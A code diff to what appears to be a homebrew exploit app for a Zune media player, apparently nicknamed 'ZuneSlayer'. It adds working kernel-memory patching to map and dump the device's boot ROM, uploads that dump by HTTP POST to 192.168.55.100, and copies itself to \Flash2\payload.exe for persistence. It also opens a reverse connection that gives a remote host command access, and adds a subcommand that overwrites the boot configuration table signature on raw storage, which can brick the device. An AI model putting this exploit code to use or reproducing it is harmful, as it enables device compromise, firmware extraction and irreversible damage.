@@ -21,6 +21,7 @@ extern "C" BOOL VirtualCopy(LPVOID lpvDest, LPVOID lpvSrc, DWORD cbSize, DWORD f
 #endif
 
 #include <winsock2.h>
+#include <wininet.h>
 #include <Iphlpapi.h>
 #include "protocol/pb_encode.h"
 #include "protocol/pb_decode.h"
@@ -127,10 +128,10 @@ static LPCWSTR getIpAddress(){
 	if ( (dwRetVal = GetIpAddrTable( pIPAddrTable, &dwSize, 0 )) != NO_ERROR ) { 
 		result=TEXT("GetIpAddrTable call failed.");
 	}else{
-		 char buffer [50];
+		 char buffer [128];
 		 in_addr me;
 		 me.S_un.S_addr = pIPAddrTable->table[0].dwAddr;
-		 sprintf (buffer, "CodePug WebServer Started.\nhttp://%s\n", inet_ntoa(me));
+		 sprintf (buffer, "CodePug WebServer Started.\nhttp://%s\nBuild: " __DATE__ " " __TIME__ "\n", inet_ntoa(me));
 		 result = MultiCharToUniChar(buffer);
 	}
 	free(pIPAddrTable);
@@ -187,6 +188,176 @@ void connection(SOCKET client) {
 					closesocket(client);
 					break;
 				}
+			// Cmd 23: IROM dump via HTTP upload to PC
+			// Reads IROM page-by-page and POSTs to httpserv on PC
+			// Packet: [23]
+			// Response: [23][status:1][http_status:4]
+			} else if (inbuf[0] == 23) {
+				out[0] = 23;
+
+				HMODULE mh23 = GetModuleHandleW(L"coredll.dll");
+
+				// Map IROM page 0 first to verify access
+				kwr(0x80060da0, 0x80069de0);
+				CSM csm23 = (CSM) GetProcAddress(mh23, L"GetFSHeapInfo");
+				DWORD irom_map = (DWORD)csm23(0xFFF00000 >> 8, 1);
+				kwr(0x80060da0, 0x80015020);
+				KFSH ghi23 = (KFSH) GetProcAddress(mh23, L"GetFSHeapInfo");
+
+				if (!irom_map) {
+					out[1] = 0; // mapping failed
+					if (safe_send(client, out, 32)) { closesocket(client); break; }
+				} else {
+					// Read 4KB from page 0
+					unsigned char irom_buf[4096];
+					for (u32 i = 0; i < 4096; i++) {
+						irom_buf[i] = (unsigned char)ghi23(irom_map + i, 0, 0x1338);
+					}
+
+					// Upload via WinInet HTTP POST to PC
+					HINTERNET hInet = InternetOpenW(L"ZuneSlayer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+					if (!hInet) {
+						out[1] = 2; // InternetOpen failed
+						DWORD ie = GetLastError();
+						out[2] = ie & 0xFF; out[3] = (ie>>8)&0xFF; out[4] = (ie>>16)&0xFF; out[5] = (ie>>24)&0xFF;
+						if (safe_send(client, out, 32)) { closesocket(client); break; }
+					} else {
+						HINTERNET hConn = InternetConnectW(hInet, L"192.168.55.100", 8080,
+							NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+						if (!hConn) {
+							out[1] = 3; // InternetConnect failed
+							DWORD ie = GetLastError();
+							out[2] = ie & 0xFF; out[3] = (ie>>8)&0xFF; out[4] = (ie>>16)&0xFF; out[5] = (ie>>24)&0xFF;
+							InternetCloseHandle(hInet);
+							if (safe_send(client, out, 32)) { closesocket(client); break; }
+						} else {
+							HINTERNET hReq = HttpOpenRequestW(hConn, L"POST", L"/upload/irom.bin",
+								NULL, NULL, NULL, 0, 0);
+							if (!hReq) {
+								out[1] = 4; // HttpOpenRequest failed
+								DWORD ie = GetLastError();
+								out[2] = ie & 0xFF; out[3] = (ie>>8)&0xFF; out[4] = (ie>>16)&0xFF; out[5] = (ie>>24)&0xFF;
+								InternetCloseHandle(hConn);
+								InternetCloseHandle(hInet);
+								if (safe_send(client, out, 32)) { closesocket(client); break; }
+							} else {
+								LPCWSTR headers = L"Content-Type: application/octet-stream";
+								BOOL sent = HttpSendRequestW(hReq, headers, -1, irom_buf, 4096);
+								DWORD ie = GetLastError();
+
+								out[1] = sent ? 1 : 5;
+								out[2] = ie & 0xFF; out[3] = (ie>>8)&0xFF; out[4] = (ie>>16)&0xFF; out[5] = (ie>>24)&0xFF;
+
+								InternetCloseHandle(hReq);
+								InternetCloseHandle(hConn);
+								InternetCloseHandle(hInet);
+								if (safe_send(client, out, 32)) { closesocket(client); break; }
+							}
+						}
+					}
+				}
+
+			// Cmd 22: Probe raw block devices and try to read/corrupt BCT
+			// Packet: [22][subcmd:1]
+			//   subcmd 0: enumerate block devices, try to read BCT
+			//   subcmd 1: corrupt BCT (write zeros over ECEC signature)
+			// Response: [22][status:1][data...]
+			} else if (inbuf[0] == 22) {
+				u32 subcmd = inbuf[1];
+				out[0] = 22;
+
+				// Try opening various block device names
+				LPCWSTR dev_names[] = {
+					L"DSK1:", L"DSK2:", L"DSK3:", L"DSK4:",
+					L"FLASHDRV:", L"NAND1:", L"NAND2:",
+					L"Store:", L"Part00:", L"Part01:", L"Part02:",
+					L"\\\\.\\PhysicalDisk0",
+					NULL
+				};
+
+				HANDLE hDev = INVALID_HANDLE_VALUE;
+				u32 dev_idx = 0;
+
+				for (int d = 0; dev_names[d] != NULL; d++) {
+					HANDLE h = CreateFileW(dev_names[d],
+						GENERIC_READ | GENERIC_WRITE, 0, NULL,
+						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+					if (h != INVALID_HANDLE_VALUE) {
+						// Found one! Read first 512 bytes
+						unsigned char sector[512];
+						DWORD bytesRead = 0;
+						SetFilePointer(h, 0, NULL, FILE_BEGIN);
+						BOOL ok = ReadFile(h, sector, 512, &bytesRead, NULL);
+
+						out[1] = 1; // found a device
+						out[2] = d; // which device index
+						out[3] = ok ? 1 : 0;
+						out[4] = bytesRead & 0xFF;
+						out[5] = (bytesRead >> 8) & 0xFF;
+
+						// Check for ECEC in first 512 bytes
+						u32 has_ecec = 0;
+						u32 ecec_off = 0;
+						for (u32 i = 0; i < bytesRead - 3; i++) {
+							if (sector[i] == 'E' && sector[i+1] == 'C' &&
+								sector[i+2] == 'E' && sector[i+3] == 'C') {
+								has_ecec = 1;
+								ecec_off = i;
+								break;
+							}
+						}
+						out[6] = has_ecec;
+						out[7] = ecec_off & 0xFF;
+						out[8] = (ecec_off >> 8) & 0xFF;
+
+						if (safe_send(client, out, 32)) { CloseHandle(h); closesocket(client); break; }
+						// Send the 512-byte sector
+						if (safe_send(client, sector, 512)) { CloseHandle(h); closesocket(client); break; }
+
+						if (subcmd == 1 && has_ecec) {
+							// Corrupt the BCT: overwrite ECEC with zeros
+							sector[ecec_off] = 0;
+							sector[ecec_off+1] = 0;
+							sector[ecec_off+2] = 0;
+							sector[ecec_off+3] = 0;
+
+							SetFilePointer(h, 0, NULL, FILE_BEGIN);
+							DWORD bytesWritten = 0;
+							BOOL wok = WriteFile(h, sector, 512, &bytesWritten, NULL);
+							DWORD werr = GetLastError();
+
+							// Send write result
+							unsigned char wres[32];
+							memset(wres, 0, 32);
+							wres[0] = 22;
+							wres[1] = wok ? 0x10 : 0x11; // 0x10 = write ok, 0x11 = write fail
+							wres[2] = bytesWritten & 0xFF;
+							wres[3] = (bytesWritten >> 8) & 0xFF;
+							wres[4] = werr & 0xFF;
+							wres[5] = (werr >> 8) & 0xFF;
+							wres[6] = (werr >> 16) & 0xFF;
+							wres[7] = (werr >> 24) & 0xFF;
+							if (safe_send(client, wres, 32)) { CloseHandle(h); closesocket(client); break; }
+						}
+
+						CloseHandle(h);
+						hDev = h;
+						dev_idx = d;
+						break; // use first device that works
+					}
+				}
+
+				if (hDev == INVALID_HANDLE_VALUE) {
+					// No device found
+					out[1] = 0; // no device
+					DWORD lerr = GetLastError();
+					out[2] = lerr & 0xFF;
+					out[3] = (lerr >> 8) & 0xFF;
+					out[4] = (lerr >> 16) & 0xFF;
+					out[5] = (lerr >> 24) & 0xFF;
+					if (safe_send(client, out, 32)) { closesocket(client); break; }
+				}
+
 			// Cmd 21: IROM full dump (64KB) — page-by-page NKCreateStaticMapping
 			// Maps each 4KB IROM page individually, reads and sends.
 			// Packet:  [21]
@@ -872,26 +1043,82 @@ DWORD Server(void* sd_) {
 			return 0;
 		}
 
-		if (bind(sd, (LPSOCKADDR)&addr, sizeof(addr)) == SOCKET_ERROR) {
-			ZDKSystem_ShowMessageBox(L"Bind fail", MESSAGEBOX_TYPE_OK);
-			return 0;
-		}
-
-		if (listen(sd,5) == SOCKET_ERROR) {
-			ZDKSystem_ShowMessageBox(L"listen fail", MESSAGEBOX_TYPE_OK);
-			return 0;
-		}
-
-
-	if (sd == INVALID_SOCKET)
-		return 0;
+	// Copy self to \Flash2\payload.exe — must happen after hax() for kernel privs
+	CopyFileW(L"\\gametitle\\584E07D1\\Content\\nativeapp.exe", L"\\Flash2\\payload.exe", false);
 
 	ZDKSystem_ShowMessageBox(getIpAddress(), MESSAGEBOX_TYPE_OK);
-	while(!dead) {
-		client = accept(sd,NULL,NULL);
 
+	int bind_ok = 0;
+	if (bind(sd, (LPSOCKADDR)&addr, sizeof(addr)) != SOCKET_ERROR) {
+		if (listen(sd, 5) != SOCKET_ERROR) {
+			bind_ok = 1;
+		}
+	}
 
-		connection(client);
+	// Auto-upload IROM dump via raw Winsock HTTP POST to PC
+	{
+		HMODULE mhA = GetModuleHandleW(L"coredll.dll");
+
+		// Map IROM page 0
+		kwr(0x80060da0, 0x80069de0);
+		CSM csmA = (CSM) GetProcAddress(mhA, L"GetFSHeapInfo");
+		DWORD irom_mapA = (DWORD)csmA(0xFFF00000 >> 8, 1);
+		kwr(0x80060da0, 0x80015020);
+		KFSH ghiA = (KFSH) GetProcAddress(mhA, L"GetFSHeapInfo");
+
+		if (irom_mapA) {
+			// Read 4KB
+			unsigned char irom_buf[4096];
+			for (u32 i = 0; i < 4096; i++) {
+				irom_buf[i] = (unsigned char)ghiA(irom_mapA + i, 0, 0x1338);
+			}
+
+			// POST via raw Winsock
+			SOCKET hs = socket(AF_INET, SOCK_STREAM, 0);
+			if (hs != INVALID_SOCKET) {
+				SOCKADDR_IN ha;
+				ha.sin_family = AF_INET;
+				ha.sin_port = htons(8080);
+				ha.sin_addr.s_addr = inet_addr("192.168.55.100");
+				if (connect(hs, (LPSOCKADDR)&ha, sizeof(ha)) == 0) {
+					// Send HTTP POST header + body
+					char hdr[256];
+					sprintf(hdr, "POST /upload/irom.bin HTTP/1.0\r\nContent-Type: application/octet-stream\r\nContent-Length: 4096\r\nConnection: close\r\n\r\n");
+					send(hs, hdr, strlen(hdr), 0);
+					send(hs, (char*)irom_buf, 4096, 0);
+					// Read response (don't care about content)
+					char resp[256];
+					recv(hs, resp, 256, 0);
+				}
+				closesocket(hs);
+			}
+		}
+	}
+
+	// Try reverse-connect to PC over USB (192.168.55.100:1337) first
+	{
+		SOCKET rc = socket(AF_INET, SOCK_STREAM, 0);
+		if (rc != INVALID_SOCKET) {
+			SOCKADDR_IN pc_addr;
+			pc_addr.sin_family = AF_INET;
+			pc_addr.sin_port = htons(1337);
+			pc_addr.sin_addr.s_addr = inet_addr("192.168.55.100");
+			if (connect(rc, (LPSOCKADDR)&pc_addr, sizeof(pc_addr)) == 0) {
+				// Connected to PC via USB!
+				connection(rc);
+				closesocket(rc);
+			} else {
+				closesocket(rc);
+			}
+		}
+	}
+
+	// Accept loop (WiFi) — only if bind succeeded
+	if (bind_ok) {
+		while(!dead) {
+			client = accept(sd,NULL,NULL);
+			connection(client);
+		}
 	}
 
     return 1;
@@ -1212,15 +1439,6 @@ if(CopyFileW(L"\\gametitle\\584E07D1\\Content\\nativeapp.exe", L"\\Flash2\\paylo
 #endif
 
 SuppressReboot();
-
-#if 1
-CopyFileW(L"\\gametitle\\584E07D1\\Content\\nativeapp.exe", L"\\Flash2\\payload.exe", false);
-#endif
-
-#if 0
-std::swprintf(foo, L"Hello");
-ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
-#endif
 
 #if 1
 	hax();
